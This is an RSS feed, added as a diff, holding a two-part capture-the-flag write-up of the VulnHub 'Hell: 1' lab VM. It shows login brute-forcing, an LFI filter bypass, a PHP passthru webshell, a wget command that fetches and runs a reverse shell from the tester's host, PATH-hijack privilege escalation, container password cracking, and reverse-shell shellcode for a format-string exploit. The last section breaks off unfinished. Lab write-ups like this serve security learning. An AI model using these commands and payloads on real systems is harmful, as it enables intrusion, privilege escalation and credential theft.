@@ -1,0 +1,736 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hell on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/hell/</link>
+    <description>Recent content in Hell on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 15 Jul 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/hell/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Hell: 1 - Part 1</title>
+      <link>http://rastamouse.me/writeups/2014/hell-1-part-1/</link>
+      <pubDate>Tue, 15 Jul 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/hell-1-part-1/</guid>
+      <description>
+
+&lt;p&gt;Hell is the latest installment of evil hosted on VulnHub, and is the devil child of Peleus.  To say it&amp;rsquo;s a difficult and lengthy challenge will not prepare you for the torture&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&amp;rsquo;t exclude beginners however and I&amp;rsquo;m sure that a few of you could meet the challenge. There is no &amp;lsquo;one&amp;rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:1f8081f406d4199da2c905fe029d67c9&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.127.102
+ 
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 6.0p1 Debian 4+deb7u1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f4:bb:f4:22:36:08:61:ef:74:2c:27:e0:b4:a2:69:d3 (DSA)
+|   2048 0e:31:1d:cf:04:d0:63:fa:5c:76:f2:dc:22:1c:f1:7c (RSA)
+|_  256 e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa (ECDSA)
+80/tcp    open     http    Apache httpd 2.2.22 ((Debian))
+| http-robots.txt: 2 disallowed entries 
+|_/personal/ /super_secret_login_path_muhahaha/
+|_http-title: Have fun!
+111/tcp   open     rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          35027/udp  status
+|_  100024  1          40080/tcp  status
+666/tcp   open     doom?
+1337/tcp  filtered waste
+40080/tcp open     status  1 (RPC #100024)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          35027/udp  status
+|_  100024  1          40080/tcp  status
+1 service unrecognized despite returning data.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;apache:1f8081f406d4199da2c905fe029d67c9&#34;&gt;Apache&lt;/h2&gt;
+
+&lt;p&gt;Popping over to port 80 in a web browser, gives you a page with the following text:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Welcome to Hell
+Our admin Jack is still busy coding up the site, but in the mean time - have a comic...
+All credit goes to Cyanide and Happiness at explosm.net.
+Hopefully by the end of the challenge you&#39;ll be experiencing one or the other of those things.
+I wonder what&#39;s on the gateway to hell? (Port 666 obv)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Without going into too much detail, the service on port 666 seemed to be a deadend to me so I continued to enumerate the apache service.&lt;/p&gt;
+
+&lt;p&gt;There are two entries in robots.txt:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;/personal/
+/super_secret_login_path_muhahaha/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The &lt;code&gt;personal&lt;/code&gt; directory contains a rather&amp;hellip; disturbing show of affection for the founder of VulnHub (and all round good guy), g0tmi1k.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/hell-1/shrine.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The &lt;code&gt;super_secret&lt;/code&gt; directory contains a login page.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/hell-1/login.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I tried a few combinations of &lt;code&gt;admin/jack&lt;/code&gt; and &lt;code&gt;g0tmi1k&lt;/code&gt;, but was unsuccessful.  There is no SQLi that I was able to find either.&lt;/p&gt;
+
+&lt;p&gt;Peleus hints on the VulnHub desription for the challenge, that some techniques required to root this VM can be found on his &lt;a href=&#34;http://netsec.ws&#34;&gt;own blog&lt;/a&gt;.  He has a good post regarding wordlists, which includes using custom word mangling rules for john.&lt;/p&gt;
+
+&lt;p&gt;I used the information to create a new mangled password list based on &lt;code&gt;g0tmi1k&lt;/code&gt; and ran it again through &lt;code&gt;hydra&lt;/code&gt;.  This time I got a hit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hell# hydra 192.168.127.128 http-form-post &amp;quot;/super_secret_login_path_muhahaha/login.php:username=^USER^ password=^PASS^ mysubmit=Login:Failed&amp;quot; -l jack -P wordlist-mangled
+ 
+[80][www-form] host: 192.168.127.128   login: jack   password: g0tmi1k69
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hmm&amp;hellip; 69, this just gets weirder and weirder&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;On the otherside of this login there are image links which take you to a bunch of different pages (some with amusing GIFs).&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/hell-1/folders.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The Personal Folder links you to another login page.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/hell-1/personal.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;When you try an incorrect login you get a countdown.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/hell-1/failcount.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;And when you reach 3 failed attempts, a large intruder alert message appears and you can no longer access any of the pages.  You must clear your cookies to try again.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/hell-1/intruder.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;These two aspects are tracked with cookies: &lt;code&gt;failcount=3; intruder=1;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;There is also the &lt;code&gt;Notes&lt;/code&gt; page, which appears to write any input to a file called &lt;code&gt;note.txt&lt;/code&gt;.  Infering from the text on the page, we can assume its being stored in &lt;code&gt;/tmp/note.txt&lt;/code&gt;.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/hell-1/notes.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Believe me&amp;hellip; I&amp;rsquo;m going somewhere with all this&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Carrying out some filename bruteforcing in the &lt;code&gt;super_secret&lt;/code&gt; directory, reveals that the HTML for the Intruder message is within a file called &lt;code&gt;1&lt;/code&gt;.  So the &lt;code&gt;intruder=1;&lt;/code&gt; cookie is actually calling a file.  You can verify this by modying the cookie to include a different file, e.g. &lt;code&gt;index.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Also, the &lt;code&gt;failcount=;&lt;/code&gt; cookie is unsanitised, so you can modify this to be any value.  Putting all this together, we have some handy php injection!&lt;/p&gt;
+
+&lt;h2 id=&#34;lfi-php-injection:1f8081f406d4199da2c905fe029d67c9&#34;&gt;LFI, PHP Injection&lt;/h2&gt;
+
+&lt;p&gt;First, I injected the following PHP code into &lt;code&gt;/tmp/note.txt&lt;/code&gt;, via &lt;code&gt;notes.php&lt;/code&gt;:
+&lt;code&gt;&amp;lt;?php passthru($_COOKIE[&#39;failcount&#39;]); ?&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This will take the input from the failcount cookie and execute it with the php passthru function.&lt;/p&gt;
+
+&lt;p&gt;I then refreshed &lt;code&gt;panel.php&lt;/code&gt; and modified the cookies accordingly.  Note that there is some filtering on the intruder cookie - it seems to remove instances of &lt;code&gt;../&lt;/code&gt;, which obviously made including &lt;code&gt;/tmp/note.txt&lt;/code&gt; difficult as you can&amp;rsquo;t use absolute paths either.  There are a couple of ways around this - mine was to do &lt;code&gt;..././&lt;/code&gt;.  The filter removes the instance of &lt;code&gt;../&lt;/code&gt; in the middle but the characters on either side just come together to form a new &lt;code&gt;../&lt;/code&gt;.  The filtering does not loop which allows this to work.  The same thing can be accomplished using &lt;code&gt;...//&lt;/code&gt; and so on&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;So:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;GET /super_secret_login_path_muhahaha/panel.php
+Cookie: 1405281617=; failcount=id; intruder=..././..././..././tmp/note.txt; PHPSESSID=u01geguamj2jakpin0vlm2peb4
+ 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I was then able to use this code execution to upload and execute a reverse shell (msfpayload).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;wget%20http%3A%2F%2F192.168.127.127%2Fshell%20-O%20%2Ftmp%2Fshell%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fshell%20%26%26%20%2Ftmp%2Fshell
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;jack:1f8081f406d4199da2c905fe029d67c9&#34;&gt;Jack&lt;/h2&gt;
+
+&lt;p&gt;With shell access as &lt;code&gt;www-data&lt;/code&gt;, I was able to read the &lt;code&gt;login.php&lt;/code&gt; file in the &lt;code&gt;super_secret&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;// mysql_connect(&amp;quot;127.0.0.1&amp;quot;, &amp;quot;Jack&amp;quot;, &amp;quot;zgcR6mU6pX&amp;quot;) or die (&amp;quot;Server Error&amp;quot;);
+I&#39;ll change this back once development is done. Got sick of typing my password.
+mysql_connect(&amp;quot;127.0.0.1&amp;quot;, &amp;quot;www-data&amp;quot;, &amp;quot;website&amp;quot;) or die(&amp;quot;Server Error&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can log into the MySQL DB with the &lt;code&gt;www-data&lt;/code&gt; credentials, but there&amp;rsquo;s nothing more to see.  The commented out password can be used to SSH into Hell as Jack.&lt;/p&gt;
+
+&lt;p&gt;Within his home directory is a folder called &lt;code&gt;g0tmi1k_pics&lt;/code&gt; containing yet more disturbing pictures, but there&amp;rsquo;s nothing hidden in the images as far as I can tell.&lt;/p&gt;
+
+&lt;p&gt;There is also a hidden directory called &lt;code&gt;.pgp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwx------ 1 jack jack   39 Jun 18 12:35 note
+-rwx------ 1 jack jack 1802 Jun 18 12:20 pgp.priv
+-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub
+ 
+jack@hell:~$ cat .pgp/note
+The usual password as with everything.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After some enumeration I found the following file, a PGP encrypted email.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;jack@hell:~$ file /var/mail/jack/received/message.eml
+/var/mail/jack/received/message.eml: PGP message
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Import the key, then decrypt the messge.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;jack@hell:~/.pgp$ gpg --import pgp.priv
+jack@hell:~/.pgp$ gpg -d /var/mail/jack/received/message.eml 
+
+You need a passphrase to unlock the secret key for
+user: &amp;quot;jack @ cowlovers.com&amp;quot;
+2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
+ 
+Enter passphrase: g0tmi1k69
+ 
+Ok Jack. I&#39;ve created the account &#39;milk_4_life&#39; as per your request. Please stop emailing me about this now or I&#39;m going to talk to HR like we discussed.
+ 
+The password is &#39;4J0WWvL5nS&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;milk-4-life:1f8081f406d4199da2c905fe029d67c9&#34;&gt;milk_4_life&lt;/h2&gt;
+
+&lt;p&gt;With SSH access as milk_4_life, some proper work begins.&lt;/p&gt;
+
+&lt;p&gt;Within his home directory is a binary file called &lt;code&gt;game&lt;/code&gt;, which seems to be a small wrapper around &lt;code&gt;/usr/bin/game.py&lt;/code&gt;.  When you run the file, all you see is the message &lt;code&gt;I&#39;m Listening&lt;/code&gt;.  &lt;code&gt;Netstat&lt;/code&gt; or &lt;code&gt;netcat&lt;/code&gt; are not installed, but there are some alternatives that can be used.&lt;/p&gt;
+
+&lt;p&gt;Using &lt;code&gt;ss -lp&lt;/code&gt;, we can see that it&amp;rsquo;s listening on the &lt;code&gt;loopback&lt;/code&gt; on port &lt;code&gt;1337&lt;/code&gt; and we can use &lt;code&gt;telnet&lt;/code&gt; to interact with it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;milk_4_life@hell:~$ telnet 127.0.0.1 1337
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is &#39;^]&#39;.
+Type &#39;START&#39; to begin
+ 
+da easy crew
+No... START. S-T-A-R-T
+ 
+START
+Starting...
+ 
+You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)
+ 
+Quick what&#39;s... 696 x 928?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There didn&amp;rsquo;t seem to be any vulnerabilities such as buffer overflows in the inputs, so let&amp;rsquo;s try and beat the game!  This reminded me a little of Chuckles&amp;rsquo; game of single syllable&amp;rsquo;s in Ultima VII&amp;hellip;  Every time you get a correct answer your score goes up, but it&amp;rsquo;s a pretty hefty score to beat in 30 seconds.&lt;/p&gt;
+
+&lt;p&gt;Realistically, the only way to win is to write an automated script.  All that&amp;rsquo;s required is to read the input of each question, split it to obtain the two numbers, make the calculation and send the answer back (all on a loop),
+&lt;code&gt;chuckles.py&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+ 
+import socket
+import re
+ 
+target = &#39;127.0.0.1&#39;
+port = 1337
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ 
+s.connect((target, port))
+s.recv(1024)
+s.send(&#39;START\n&#39;)
+s.recv(1024)
+ 
+while True:
+ 
+        data = s.recv(1024)
+        line = re.findall(r&amp;quot;Quick what&#39;s... (.*?)\?&amp;quot;, data)
+ 
+        if not line:
+ 
+                print data
+                break
+ 
+        (a,b) = line[0].split(&#39; x &#39;)
+ 
+        mul = int(a) * int(b)
+        print str(data)  + str(mul)
+        s.send(str(mul)+&#39;\n&#39;)
+ 
+print s.recv(1024)
+s.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;milk_4_life@hell:~$ ./chuckles.py 
+[...snip...]
+Final Score: 397261
+!*!*!*!*! Congratulations, new high score (397261) !*!*!*!*!
+ 
+I hear the faint sound of chmodding.......
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This implies that when you win the game, a file permission is changed.  Unfortunately it&amp;rsquo;s not helpful enough to tell us which one.  It&amp;rsquo;s logical to assume that because the owner of game is &lt;code&gt;george&lt;/code&gt;, then any modification it makes must also be to a file owned by george.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;milk_4_life@hell:~$ find / -user george 2&amp;gt;/dev/null 
+/home/milk_4_life/game
+/home/george
+/usr/bin/game.py
+/usr/bin/lesson101
+/var/mail/george
+/var/mail/george/signup.eml
+
+---x--x--x 1 george george 6531 Jun 19 15:13 /usr/bin/lesson101          &amp;lt;-- before
+---s--x--x 1 george george 6531 Jun 19 15:13 /usr/bin/lesson101          &amp;lt;-- after
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My brief investigation into this binary showed that there may a buffer overflow in the &lt;code&gt;Name&lt;/code&gt; field (after you correctly guess the numer in fewer than 3 guesses).  However, I was able to gain access as george through a slightly different route.  The game binary executes a &lt;code&gt;chmod&lt;/code&gt; on &lt;code&gt;lesson101&lt;/code&gt;, but on a hunch I hoped that the chmod path was not hardcoded in the binary (this was described as a bug in v1 of Hades).&lt;/p&gt;
+
+&lt;p&gt;I wrote a simple C program that would run an instance of &lt;code&gt;/bin/sh&lt;/code&gt;, compiled it into a binary called &lt;code&gt;chmod&lt;/code&gt; and placed it in &lt;code&gt;/tmp&lt;/code&gt;.  Then place &lt;code&gt;/tmp&lt;/code&gt; at the beginning of the environmental path variable and play the game.  The binary (with it&amp;rsquo;s suid bit) executes &lt;code&gt;/tmp/chmod&lt;/code&gt; and gives you a shell as George.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;chmod.c
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+int main()
+{
+        system(&amp;quot;/bin/sh -i&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;milk_4_life@hell:/tmp$ gcc chmod.c -o chmod
+milk_4_life@hell:/tmp$ PATH=/tmp:$PATH
+milk_4_life@hell:~$ ./game
+ 
+I&#39;m listening
+$ id
+uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;george:1f8081f406d4199da2c905fe029d67c9&#34;&gt;George&lt;/h2&gt;
+
+&lt;p&gt;This allows you to enter George&amp;rsquo;s home directory.  To give myself persistent access, I created a &lt;code&gt;.ssh&lt;/code&gt; directory and echo&amp;rsquo;d my public SSH key into &lt;code&gt;authorized_keys&lt;/code&gt; - this allows me to SSH in as George, without a password.
+George does have an email (which is readable before now), but contains an interesting reference to the &lt;code&gt;rockyou&lt;/code&gt; wordlist.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rw-r--r-- 1 george george 175 Jun 20 13:06 /var/mail/george/signup.eml
+ 
+From: admin @ rockyou.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Within his home area is a file called &lt;code&gt;container.rc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rw------- 1 george george 4194304 Jun 19 21:09 container.tc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The TC file extension indicates that this is a TrueCrypt encrypted disk - this can be easily decrypted using the NSA backdoor (joke, but probably true :s).  I transfered the container to my Windows host, where I have &lt;code&gt;cudaHashcat&lt;/code&gt; working, and ran it against the rockyou wordlist.  The correct password was found in about 27 seconds.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cudaHashcat64.exe -m 6211 conntainer.tc rockyou.txt
+letsyouupdateyourfunnotesandmore
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With this, the container can be decrypted and mounted.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;george@hell:~$ truecrypt container.tc
+Enter mount directory [default]: /mnt/truecrypt
+Enter password for /home/george/container.tc:
+Enter keyfile [none]:
+Protect hidden volume (if any)? (y=Yes/n=No) [No]:
+ 
+george@hell:~$ ls -l /mnt/truecrypt/
+-rwx------ 1 george george 1679 Jul  5 20:01 id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Hell: 1 - Part 2</title>
+      <link>http://rastamouse.me/writeups/2014/hell-1-part-2/</link>
+      <pubDate>Tue, 15 Jul 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/hell-1-part-2/</guid>
+      <description>
+
+&lt;h2 id=&#34;bazza:b7fe5a88214a93180782efcb19cdbc62&#34;&gt;Bazza&lt;/h2&gt;
+
+&lt;p&gt;With this private key, I was able to SSH in as another user, Bazza.  Within his home directory are two binary files with some interesting permissions.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-r-xr-sr-x 1 oj   developers 6239 Jul  6 18:39 part1
+-r-sr-xr-x 1 oj   oj         5312 Jul  6 18:34 part2
+
+bazza@hell:~$ ./part1
+Checking integrity of part2... Done!!
+ 
+Checking integrity of calling target... Done!!
+ 
+Binary and target confirmed.
+ 
+Can&#39;t touch this *nah na na na na naaaaaaaa nah*
+uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
+
+bazza@hell:~$ ./part2
+Error! 1004 ID detected ... you&#39;re not allowed to run this, please use part 1!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;These binaries are readable, so can be run through strings.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bazza@hell:~$ strings part1
+[...snip...]
+900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
+1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
+[...snip...]
+sha256sum /home/bazza/part2
+sha256sum /usr/bin/id
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are hardcoded sha256 sums which are compared with the output of &lt;code&gt;sha256sum&lt;/code&gt;.  Fortunately the &lt;code&gt;sha256sum&lt;/code&gt; path is not hardcoded, meaning it relies on the environmental path variables.  This can be abused as previously, to fool these binaries to execute arbitary code of our own making.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Part1&lt;/code&gt; has the SUID bit set on the group (developers); &lt;code&gt;Part2&lt;/code&gt; checks the EGID of the user running it and has the SUID bit set on owner (oj).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;sha256sum.c
+ 
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+ 
+int main()
+{
+        system(&amp;quot;/bin/cp /bin/sh /tmp/sh&amp;quot;);
+        system(&amp;quot;/bin/chmod g+s /tmp/sh&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bazza@hell:~$ ./part1
+[...snip...]
+bazza@hell:~$ /tmp/sh
+$ id
+uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;id.c
+ 
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+ 
+int main()
+{
+        system(&amp;quot;/bin/cp /bin/sh /tmp/oj&amp;quot;);
+        system(&amp;quot;/bin/chmod u+s /tmp/oj&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ./part2
+$ /tmp/oj
+$ whoami
+oj
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I am OJ (I wish I was as good as OJ)  :)&lt;/p&gt;
+
+&lt;h2 id=&#34;thecolonial:b7fe5a88214a93180782efcb19cdbc62&#34;&gt;TheColonial&lt;/h2&gt;
+
+&lt;p&gt;This is the final hurdle, but it&amp;rsquo;s a doosy.  There is a binary, &lt;code&gt;echo&lt;/code&gt; in his home directory, owned by root and has the SUID bit set.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-r-sr-xr-x 1 root root 592549 Jul  5 21:12 echo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It takes user input and echo&amp;rsquo;s it back - simple.  Playing with the input, I found that it has a string format vulnerability, which will ultimately allow hijack of the application flow.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;oj@hell:~$ ./echo AAAA%p
+AAAA0x80488c0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;First, I need to check for protections.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;oj@hell:~$ ./checksec.sh --file echo 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   echo
+
+oj@hell:~$ cat /proc/sys/kernel/randomize_va_space 
+0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It was a bit of a pain to find my string on the stack, but I eventually found it to be at 116th position.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;oj@hell:~$ ./echo `printf &#39;AAAA%%116$p&#39;`
+AAAA0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hopefully, I will be able to overwrite the address for printf with the location of my own shellcode.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ export SHELLCODE=$(python -c &#39;print &amp;quot;\x90&amp;quot; * 500 + &amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x7f\x65\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&#39;)
+
+$ ./addr SHELLCODE
+0xbffffdbd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;addr.c
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+int main(int argc, char *argv[])
+{
+   if(!argv[1])
+      exit(1);
+   printf(&amp;quot;%#x\n&amp;quot;, getenv(argv[1]));
+   return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The binary is statically linked, so we can&amp;rsquo;t do things such as &lt;code&gt;p system&lt;/code&gt; in &lt;code&gt;gdb&lt;/code&gt; or &lt;code&gt;objdump -R&lt;/code&gt; to obtain the GOT.  We shall have to overwrite the destructor (DTOR) instead.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;oj@hell:~$ nm echo | grep -i dtor
+080481e0 t __do_global_dtors_aux
+080c9614 t __do_global_dtors_aux_fini_array_entry
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;to be completed&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;flag:b7fe5a88214a93180782efcb19cdbc62&#34;&gt;Flag&lt;/h2&gt;
+
